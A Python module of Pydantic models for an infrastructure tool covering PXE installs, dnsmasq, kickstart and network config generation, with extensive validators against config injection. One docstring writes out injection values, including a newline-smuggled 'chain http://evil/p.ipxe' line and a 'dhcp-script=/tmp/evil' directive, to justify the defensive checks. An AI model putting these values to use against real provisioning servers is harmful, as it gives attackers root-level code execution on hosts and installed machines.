"""Pydantic 请求/响应模型。"""
from __future__ import annotations

import ipaddress
import re
from datetime import datetime
from typing import Any, Optional

from pydantic import BaseModel, ConfigDict, field_validator, model_serializer


class ORMBase(BaseModel):
    model_config = ConfigDict(from_attributes=True)


# ---------- IT 网络配置：输入侧校验辅助（NC2） ----------
_IFNAME_PATTERN = r"^[A-Za-z0-9._:-]{1,32}$"
_HOSTNAME_PATTERN = r"^[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?$"
_IFNAME_RE = re.compile(_IFNAME_PATTERN)
_HOSTNAME_RE = re.compile(_HOSTNAME_PATTERN)


def _require_ifname(value: str) -> str:
    """接口名白名单校验（NC2：防 shell 注入）。"""
    if _IFNAME_RE.fullmatch(value) is None:
        raise ValueError(f"invalid interface name {value!r}: must match {_IFNAME_PATTERN}")
    return value


def _require_ipv4(value: str, kind: str) -> str:
    """必须为合法 IPv4 地址；合法时原样返回（NC2）。"""
    try:
        ipaddress.IPv4Address(value)
    except ValueError:
        raise ValueError(f"invalid IPv4 {kind}: {value!r}") from None
    return value


def _require_netmask(value: str) -> str:
    """必须为合法且连续的 IPv4 掩码（NC2：拒绝非连续掩码）。"""
    try:
        addr = ipaddress.IPv4Address(value)
    except ValueError:
        raise ValueError(f"invalid IPv4 netmask: {value!r}") from None
    inverted = (~int(addr)) & 0xFFFFFFFF
    if (inverted & (inverted + 1)) != 0:
        raise ValueError(f"non-contiguous IPv4 netmask: {value!r}")
    return value


def _require_dns_list(value: list[str]) -> list[str]:
    """dns 列表每个元素都必须为合法 IPv4（NC2）。"""
    for item in value:
        _require_ipv4(item, kind="dns entry")
    return value


def _require_cidr(value: Optional[int]) -> Optional[int]:
    """cidr 必须为 0..32 范围内的整数（NC2）。"""
    if value is None:
        return None
    if not 0 <= value <= 32:
        raise ValueError(f"cidr must be an integer in 0..32, got {value!r}")
    return value


# ---------- PXE 输入侧校验辅助（D7：防 dnsmasq/iPXE/文件名注入） ----------
_MAC_PATTERN = r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$"
_MAC_RE = re.compile(_MAC_PATTERN)


def _require_mac(value: str) -> str:
    """必须为 aa:bb:cc:dd:ee:ff 形式的 MAC，冒号分隔、大小写不敏感（D7）。

    其余任何字符一律拒绝：换行可向 dnsmasq.conf 注入任意指令（宿主机 root 代码执行），
    `/` 会变成 boot/<tag>.ipxe 的路径片段，空格/分号等同样不允许。
    合法时原样返回（不做大小写归一，保持存量存储与生成行为零变化）。
    """
    if _MAC_RE.fullmatch(value) is None:
        raise ValueError(
            f"invalid MAC {value!r}: must be aa:bb:cc:dd:ee:ff form matching {_MAC_PATTERN}"
        )
    return value


def _require_hostname(value: str) -> str:
    """必须为 RFC1123 单标签主机名（D7；复用 NC2 的 _HOSTNAME_RE）。"""
    if _HOSTNAME_RE.fullmatch(value) is None:
        raise ValueError(
            f"invalid hostname {value!r}: must be an RFC1123 single label matching {_HOSTNAME_PATTERN}"
        )
    return value


# 用户名白名单。admin_user 会落进两个【特权】上下文：
#   · RHEL kickstart 的 %post（装机时以 root 执行）：`mkdir -p /home/<user>/.ssh`、`chown -R <user>:<user>`
#   · Ubuntu autoinstall 的 YAML：`username: <user>`
# 含 `;` 可在 %post 里注入任意 root 命令；含换行可在 YAML 里插入 `groups: [sudo]` 之类的新键。
# 只允许标准 Unix 用户名形态（不以 '-' 开头），生产存量值 'ops'/'a' 均通过。
_USERNAME_PATTERN = r"^[A-Za-z_][A-Za-z0-9_-]{0,31}$"
_USERNAME_RE = re.compile(_USERNAME_PATTERN)


def _require_username(value: str) -> str:
    if _USERNAME_RE.fullmatch(value) is None:
        raise ValueError(
            f"invalid username {value!r}: must match {_USERNAME_PATTERN}"
        )
    return value


# ---------- 认证 ----------
class LoginIn(BaseModel):
    username: str
    password: str


class ChangePasswordIn(BaseModel):
    """修改当前用户口令。要求提供原口令（避免 token 泄露即可直接改口令）。

    新口令给一个最低长度约束：这是本工具唯一的管理入口，太短等于没设。
    """
    old_password: str
    new_password: str

    @field_validator("new_password")
    @classmethod
    def _check_new_password(cls, v: str) -> str:
        if len(v) < 8:
            raise ValueError("新口令至少 8 位")
        if v == "admin@123":
            raise ValueError("不允许把口令设回历史默认值")
        return v


class TokenOut(BaseModel):
    access_token: str
    token_type: str = "bearer"
    display_name: str = ""
    role: str = "admin"


# ---------- 凭据 ----------
class CredentialIn(BaseModel):
    name: str
    username: str
    password: Optional[str] = None
    ssh_key: Optional[str] = None
    enable_secret: Optional[str] = None
    device_type: str = ""
    port: int = 22
    remark: str = ""


class CredentialOut(ORMBase):
    id: str
    name: str
    username: str
    device_type: str
    port: int
    remark: str
    has_password: bool = False
    has_ssh_key: bool = False
    created_at: Optional[datetime] = None


# ---------- 资产 ----------
class AssetIn(BaseModel):
    name: str
    category: str  # ct / it
    vendor: str = ""
    device_role: str = ""
    host: str
    port: int = 22
    device_type: str = ""
    serial: Optional[str] = None
    mac: Optional[str] = None
    location: Optional[str] = None
    tags: dict[str, Any] = {}
    remark: str = ""
    credential_id: Optional[str] = None


class AssetOut(ORMBase):
    id: str
    name: str
    category: str
    vendor: str
    device_role: str
    host: str
    port: int
    device_type: str
    serial: Optional[str] = None
    mac: Optional[str] = None
    location: Optional[str] = None
    tags: dict[str, Any] = {}
    remark: str = ""
    credential_id: Optional[str] = None
    created_at: Optional[datetime] = None


# ---------- 巡检 ----------
class InspectionCreate(BaseModel):
    name: str
    kind: str = "default"        # default / custom
    template: Optional[str] = None
    commands: Optional[list[str]] = None
    asset_ids: list[str] = []


class CommandExecIn(BaseModel):
    """自定义命令即时执行。"""
    asset_ids: list[str]
    commands: list[str]
    disable_pager: bool = True


class MetricItem(BaseModel):
    label: str
    value: Any
    status: str = "ok"   # ok / warning / critical / unknown
    raw_key: str = ""


class InspectionResultOut(ORMBase):
    id: str
    asset_id: str
    asset_name: str
    status: str
    error: str
    metrics: dict[str, Any] = {}
    raw: list[dict[str, Any]] = []
    created_at: Optional[datetime] = None


class InspectionTaskOut(ORMBase):
    id: str
    name: str
    kind: str
    template: Optional[str] = None
    commands: Optional[list[str]] = None
    asset_ids: list[str] = []
    status: str
    created_by: Optional[str] = None
    created_at: Optional[datetime] = None
    finished_at: Optional[datetime] = None


# ---------- 巡检模板 ----------
class TemplateItemIn(BaseModel):
    key: str = ""
    label: str = ""
    command: str = ""
    textfsm: str = ""
    unit: str = ""


class InspectionTemplateIn(BaseModel):
    name: str
    vendor: str = ""
    items: list[TemplateItemIn] = []
    description: str = ""


class InspectionTemplateOut(ORMBase):
    id: str
    name: str
    vendor: str
    is_system: bool = False
    items: list = []
    description: str = ""
    created_at: Optional[datetime] = None


# ---------- PXE 装机 ----------
class PxeProfileIn(BaseModel):
    name: str
    os_type: str = "ubuntu"       # ubuntu / rhel
    os_version: str = "22.04"
    timezone: str = "Asia/Shanghai"
    locale: str = "en_US.UTF-8"
    keyboard: str = "us"
    admin_user: str = "ops"


    @field_validator("admin_user")
    @classmethod
    def _check_admin_user(cls, v: str) -> str:
        return _require_username(v)
    admin_password: Optional[str] = None
    root_password: Optional[str] = None
    ssh_keys: list[str] = []
    disk_scheme: str = "lvm"      # lvm / direct
    disk_config: dict[str, Any] = {}
    net_mode: str = "dhcp"        # dhcp / static
    net_config: dict[str, Any] = {}
    mirror: str = ""
    extra_packages: list[str] = []
    post_script: str = ""
    remark: str = ""
    # PXE 服务端参数
    server_ip: str = "192.168.1.100"
    http_root: str = "http://192.168.1.100:8000/pxe"
    kernel_path: str = ""
    initrd_path: str = ""
    squashfs_path: str = ""
    deploy_mode: str = "standalone"  # standalone / proxy / relay


class PxeProfileOut(ORMBase):
    id: str
    name: str
    os_type: str
    os_version: str
    timezone: str
    locale: str
    keyboard: str
    admin_user: str
    ssh_keys: list = []
    disk_scheme: str
    disk_config: dict = {}
    net_mode: str
    net_config: dict = {}
    mirror: str
    extra_packages: list = []
    post_script: str = ""
    remark: str = ""
    server_ip: str = ""
    http_root: str = ""
    kernel_path: str = ""
    initrd_path: str = ""
    squashfs_path: str = ""
    created_at: Optional[datetime] = None


class PxeInstallIn(BaseModel):
    profile_id: str
    hostname: str
    mac: str
    ip: Optional[str] = None


    @field_validator("mac")
    @classmethod
    def _check_mac(cls, v: str) -> str:
        return _require_mac(v)


    @field_validator("hostname")
    @classmethod
    def _check_hostname(cls, v: str) -> str:
        # 空串视为未填（生成期回退到模板 hostname），非空必须过 RFC1123 单标签
        return v if not v else _require_hostname(v)


    @field_validator("ip")
    @classmethod
    def _check_ip(cls, v: Optional[str]) -> Optional[str]:
        # None/空串视为未填；给了就必须是合法 IPv4（D7）
        return _require_ipv4(v, kind="address") if v else v

class PxeInstallOut(ORMBase):
    id: str
    profile_id: str
    hostname: str
    mac: str
    ip: Optional[str] = None
    status: str
    created_at: Optional[datetime] = None
    finished_at: Optional[datetime] = None


# ---------- PXE 生成/部署请求体（D7 第 2 层；U-C 建，api/pxe.py 的 U-D 用；字段与默认值按规格写死） ----------
class PxeInstallItem(BaseModel):
    """generate/download body 里 installs 的逐项模型（D7）。"""

    mac: str                    # 必填，必须是 aa:bb:cc:dd:ee:ff（大小写不敏感）
    hostname: str = ""          # 可选；给了就必须是 RFC1123 单标签
    ip: Optional[str] = None    # 可选；给了就必须是合法 IPv4


    @field_validator("mac")
    @classmethod
    def _check_mac(cls, v: str) -> str:
        return _require_mac(v)


    @field_validator("hostname")
    @classmethod
    def _check_hostname(cls, v: str) -> str:
        return v if not v else _require_hostname(v)


    @field_validator("ip")
    @classmethod
    def _check_ip(cls, v: Optional[str]) -> Optional[str]:
        return _require_ipv4(v, kind="address") if v else v


class PxeNetConfigIn(BaseModel):
    """generate/download/deploy body 里 net_config 的带校验模型（D7 附加）。

    只声明 _dnsmasq() 直接插值的五个键并逐键校验（interface 网卡名白名单；
    gateway/dns_server/dhcp_start/dhcp_end 走 IPv4），非法值在 HTTP 层 422。
    未知键必须容忍：生产 deploy 会把 detect_network() 的结果并进 net_config，
    其中含 warnings: list[str]（还有 server_ip 等）——所以 extra="allow"
    原样保留未知键，绝不因未知键 422；未知键经 model_dump() 原样回传。
    """

    model_config = ConfigDict(extra="allow")

    interface: Optional[str] = None   # 网卡名白名单
    gateway: Optional[str] = None
    dns_server: Optional[str] = None
    dhcp_start: Optional[str] = None
    dhcp_end: Optional[str] = None


    @field_validator("interface")
    @classmethod
    def _check_interface(cls, v: Optional[str]) -> Optional[str]:
        return _require_ifname(v) if v else v


    @field_validator("gateway", "dns_server", "dhcp_start", "dhcp_end")
    @classmethod
    def _check_ipv4_fields(cls, v: Optional[str]) -> Optional[str]:
        return _require_ipv4(v, kind="address") if v else v


    @model_serializer
    def _serialize_only_set(self) -> dict:
        """序列化只输出「有值的键」：未填（None）的声明键不输出，未知键原样输出。

        这样把 model_dump() 结果 update 进 net_config 时，不会用 None 覆盖
        已有/探测到的值（detect_network() 就是「只放有值键」的约定），
        也不会丢掉 warnings/server_ip 等附加键。
        """
        out: dict = dict(self.__pydantic_extra__ or {})
        for key in ("interface", "gateway", "dns_server", "dhcp_start", "dhcp_end"):
            val = getattr(self, key)
            if val is not None:
                out[key] = val
        return out


class PxeGenerateIn(BaseModel):
    """generate / download / deploy 三个入口的请求体模型（D7 第 2 层）。

    字段名与默认值按规格原文写死，前端 Pxe.vue 实测发送的形状必须原样通过：
    - generate/download：hostname/server_ip/http_root/kernel_path/initrd_path/
      squashfs_path/deploy_mode + installs:[{mac, hostname}]
    - deploy：只发 deploy_mode、server_ip（server_ip 可为空串=由后端自动探测）
    """

    hostname: str = "default"          # RFC1123 单标签
    server_ip: str = ""                # 给了就必须是合法 IPv4
    http_root: str = ""
    kernel_path: str = ""
    initrd_path: str = ""
    squashfs_path: str = ""
    # 可挂载安装介质：留空则按 os_type/os_version 在 /srv/opstk/iso 自动匹配
    iso_url: str = ""
    # 内核控制台：留空则用后端默认值（带串口，便于无显示器机器的装机排障）
    kernel_console: str = ""
    # RHEL 系：stage2（含 images/ 的那一层）与额外仓库（如 AppStream）。
    # 留空时后端会按 mirror 指向的本机发布目录自动探测。
    stage2: str = ""
    extra_repos: list = []
    deploy_mode: str = "standalone"    # standalone / proxy / relay
    net_config: PxeNetConfigIn = PxeNetConfigIn()
    installs: list[PxeInstallItem] = []


    @field_validator("hostname")
    @classmethod
    def _check_hostname(cls, v: str) -> str:
        return v if not v else _require_hostname(v)


    @field_validator("server_ip")
    @classmethod
    def _check_server_ip(cls, v: str) -> str:
        return v if not v else _require_ipv4(v, kind="server_ip")


    @field_validator("deploy_mode")
    @classmethod
    def _check_deploy_mode(cls, v: str) -> str:
        # 空串回退默认（生成器按 mode or "standalone" 处理）；非空必须落在本行
        # 注释给出的三值白名单内：未知值会被 _mode_label() 原样拼进 dnsmasq.conf
        # 的 "# 部署模式: " 注释行，含换行即可注入新的指令行。
        if not v:
            return v
        if v not in ("standalone", "proxy", "relay"):
            raise ValueError(
                f"invalid deploy_mode {v!r}: must be one of standalone/proxy/relay"
            )
        return v


    @field_validator("*")
    @classmethod
    def _reject_control_chars(cls, v):
        """任何字符串字段都不允许换行/控制字符（第 2 层）。

        这些字段会被原样拼进 iPXE 脚本、dnsmasq.conf、autoinstall YAML 与 kickstart，
        而它们全都以**换行分隔行** —— 一个换行就能注入一整行。实测（改前）：
          iso_url   = "http://x/y.iso\\nchain http://evil/p.ipxe"
              → boot.ipxe 里多出一行 `chain http://evil/p.ipxe`，
                裸机在装机时会去执行攻击者脚本；
          http_root = "http://x\\ndhcp-script=/tmp/evil"
              → dnsmasq.conf 里多出一行 `dhcp-script=/tmp/evil/boot.ipxe`，
                而该 conf 由**宿主 root dnsmasq** 加载（compose 把 /etc/dnsmasq.d 挂进容器），
                属 root 级影响面。
        generator 第 3 层（_validate_lines/_safe_line）还有一次统一兜底；
        这里先拦一次是为了给出"到底是哪个字段"的精确 422。
        （PxeProfileIn 的 post_script 是多行字段，所以那边不加通配校验。）
        """
        if isinstance(v, str) and any(ord(ch) < 0x20 or ord(ch) == 0x7F for ch in v):
            raise ValueError("不允许包含换行或控制字符（会造成配置注入）")
        return v


class PxeGenerateResult(BaseModel):
    files: dict[str, str] = {}


# ---------- IT 网络配置生成 ----------
class NetInterfaceIn(BaseModel):
    name: str                       # 网卡名 eth0 / ens33 / eno1
    mode: str = "static"            # static / dhcp
    ip: Optional[str] = None
    netmask: Optional[str] = None   # 或 cidr
    cidr: Optional[int] = None
    gateway: Optional[str] = None
    dns: list[str] = []


    @field_validator("name")
    @classmethod
    def _check_name(cls, v: str) -> str:
        return _require_ifname(v)

    @field_validator("ip", "gateway")
    @classmethod
    def _check_ip_gateway(cls, v: Optional[str]) -> Optional[str]:
        return None if v is None else _require_ipv4(v, kind="address")

    @field_validator("netmask")
    @classmethod
    def _check_netmask(cls, v: Optional[str]) -> Optional[str]:
        return None if v is None else _require_netmask(v)

    @field_validator("cidr")
    @classmethod
    def _check_cidr(cls, v: Optional[int]) -> Optional[int]:
        return _require_cidr(v)

    @field_validator("dns")
    @classmethod
    def _check_dns(cls, v: list[str]) -> list[str]:
        return _require_dns_list(v)


class NetBondIn(BaseModel):
    name: str                       # bond0
    mode: int = 1                   # 0..6
    interfaces: list[str]           # 从接口
    ip: Optional[str] = None
    netmask: Optional[str] = None
    cidr: Optional[int] = None
    gateway: Optional[str] = None
    dns: list[str] = []
    miimon: int = 100
    primary: Optional[str] = None   # active-backup 主接口
    lacp_rate: Optional[str] = None  # 802.3ad: slow / fast
    xmit_hash_policy: Optional[str] = None  # balance-xor/802.3ad: layer2 / layer2+3 / layer3+4


    @field_validator("name")
    @classmethod
    def _check_name(cls, v: str) -> str:
        return _require_ifname(v)

    @field_validator("mode")
    @classmethod
    def _check_mode(cls, v: int) -> int:
        if not 0 <= v <= 6:
            raise ValueError(f"bond mode must be an integer in 0..6, got {v!r}")
        return v

    @field_validator("ip", "gateway")
    @classmethod
    def _check_ip_gateway(cls, v: Optional[str]) -> Optional[str]:
        return None if v is None else _require_ipv4(v, kind="address")

    @field_validator("netmask")
    @classmethod
    def _check_netmask(cls, v: Optional[str]) -> Optional[str]:
        return None if v is None else _require_netmask(v)

    @field_validator("cidr")
    @classmethod
    def _check_cidr(cls, v: Optional[int]) -> Optional[int]:
        return _require_cidr(v)

    @field_validator("dns")
    @classmethod
    def _check_dns(cls, v: list[str]) -> list[str]:
        return _require_dns_list(v)


class NetVlanIn(BaseModel):
    parent: str                     # 父接口
    vlan_id: int
    mode: str = "static"
    ip: Optional[str] = None
    netmask: Optional[str] = None
    cidr: Optional[int] = None
    gateway: Optional[str] = None


    @field_validator("parent")
    @classmethod
    def _check_parent(cls, v: str) -> str:
        return _require_ifname(v)

    @field_validator("vlan_id")
    @classmethod
    def _check_vlan_id(cls, v: int) -> int:
        if not 1 <= v <= 4094:
            raise ValueError(f"vlan_id must be an integer in 1..4094, got {v!r}")
        return v

    @field_validator("ip", "gateway")
    @classmethod
    def _check_ip_gateway(cls, v: Optional[str]) -> Optional[str]:
        return None if v is None else _require_ipv4(v, kind="address")

    @field_validator("netmask")
    @classmethod
    def _check_netmask(cls, v: Optional[str]) -> Optional[str]:
        return None if v is None else _require_netmask(v)

    @field_validator("cidr")
    @classmethod
    def _check_cidr(cls, v: Optional[int]) -> Optional[int]:
        return _require_cidr(v)


class NetBridgeIn(BaseModel):
    name: str                       # br0
    interfaces: list[str]
    ip: Optional[str] = None
    netmask: Optional[str] = None
    cidr: Optional[int] = None
    gateway: Optional[str] = None


    @field_validator("name")
    @classmethod
    def _check_name(cls, v: str) -> str:
        return _require_ifname(v)

    @field_validator("ip", "gateway")
    @classmethod
    def _check_ip_gateway(cls, v: Optional[str]) -> Optional[str]:
        return None if v is None else _require_ipv4(v, kind="address")

    @field_validator("netmask")
    @classmethod
    def _check_netmask(cls, v: Optional[str]) -> Optional[str]:
        return None if v is None else _require_netmask(v)

    @field_validator("cidr")
    @classmethod
    def _check_cidr(cls, v: Optional[int]) -> Optional[int]:
        return _require_cidr(v)


class NetConfigRequest(BaseModel):
    os: str                          # ubuntu / rhel
    hostname: Optional[str] = None
    interfaces: list[NetInterfaceIn] = []
    bonds: list[NetBondIn] = []
    vlans: list[NetVlanIn] = []
    bridges: list[NetBridgeIn] = []
    format: str = "nmcli"           # nmcli / netplan(仅ubuntu)
    netplan_renderer: str = "networkd"  # networkd(服务器推荐) / NetworkManager(无线/动态)


    @field_validator("hostname")
    @classmethod
    def _check_hostname(cls, v: Optional[str]) -> Optional[str]:
        if v is None:
            return v
        if _HOSTNAME_RE.fullmatch(v) is None:
            raise ValueError(
                f"invalid hostname {v!r}: must be an RFC1123 single label matching {_HOSTNAME_PATTERN}"
            )
        return v


class NetConfigResult(BaseModel):
    script: str
    format: str
    filename: str


# ---------- CT ZTP ?? ----------
class ZtpDeviceIn(BaseModel):
    template_id: str = ""
    hostname: str = ""
    mac: str = ""
    serial: str = ""
    mgmt_ip: Optional[str] = None


class ZtpDeviceOut(ORMBase):
    id: str
    template_id: str
    hostname: str
    mac: str
    serial: str
    mgmt_ip: Optional[str] = None
    created_at: Optional[datetime] = None


class ZtpTemplateIn(BaseModel):
    name: str
    vendor: str = "h3c"                    # h3c / huawei / cisco
    mgmt_vlan: int = 10
    mgmt_interface: str = "Vlan-interface10"
    mgmt_netmask: str = "255.255.255.0"
    mgmt_gateway: str = "10.0.0.254"
    dns_servers: list[str] = ["114.114.114.114"]
    ntp_server: str = "10.0.0.254"
    snmp_community: str = "public"
    domain_name: str = ""
    vlans: list[dict[str, Any]] = []
    admin_user: str = "admin"
    admin_password: Optional[str] = None
    enable_secret: Optional[str] = None
    ssh_keys: list[str] = []
    uplink_port: str = ""
    access_ports: list[str] = []
    extra_config: str = ""
    server_ip: str = "10.0.0.250"
    tftp_root: str = "/srv/tftp"
    http_root: str = "http://10.0.0.250:8000/ztp"
    deploy_mode: str = "standalone"
    dhcp_iface: str = "eth0"
    dhcp_start: str = "10.0.0.100"
    dhcp_end: str = "10.0.0.200"
    remark: str = ""


class ZtpTemplateOut(ORMBase):
    id: str
    name: str
    vendor: str
    mgmt_vlan: int
    mgmt_interface: str
    mgmt_netmask: str
    mgmt_gateway: str
    dns_servers: list = []
    ntp_server: str
    snmp_community: str
    domain_name: str
    vlans: list = []
    admin_user: str
    ssh_keys: list = []
    uplink_port: str
    access_ports: list = []
    extra_config: str
    server_ip: str
    tftp_root: str
    http_root: str
    deploy_mode: str
    dhcp_iface: str
    dhcp_start: str
    dhcp_end: str
    remark: str
    created_at: Optional[datetime] = None


class ZtpGenerateResult(BaseModel):
    files: dict[str, str] = {}

